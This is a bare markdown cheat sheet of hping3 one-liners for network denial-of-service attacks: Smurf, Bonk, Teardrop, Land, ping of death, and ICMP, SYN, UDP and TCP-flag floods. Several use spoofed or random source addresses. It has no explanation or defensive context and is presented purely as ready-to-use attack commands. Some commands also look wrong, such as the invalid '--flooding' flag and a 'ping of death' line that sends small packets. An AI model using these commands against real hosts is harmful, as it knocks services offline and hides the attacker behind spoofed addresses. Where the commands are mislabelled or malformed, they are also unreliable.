# hping3
## ICMP Smurf Attack
```
hping3 -1 -a ip brodcast-ip --flood
```

## Bonk Attack
```
hping3 ip -Q
```

## Teardrop Attack
```
hping3 -1 ip -g 185
```

## Land Attack
```
hping3 -1 -a ip ip --flood
```

## Ping of death Attack
```
hping3 -1 --rand-source ip -d 50 --flood 
```

## ICMP Flooding Attack
```
hping3 -1 ip --flooding
```

## SYN Flooding Attack
```
hping3 -S -a 1.1.1.1 ip --flood
```

## UDP Flooding Attack
```
hping3 -2 ip -p port --flood
```

## Out of band Flooding Attack
```
hping3 -A ip -p port --flood
hping3 -P ip -p port --flood
hping3 -R ip -p port --flood
hping3 -U ip -p port --flood
hping3 -F ip -p port --flood
hping3 -SAPRUF ip -p port --flood
```
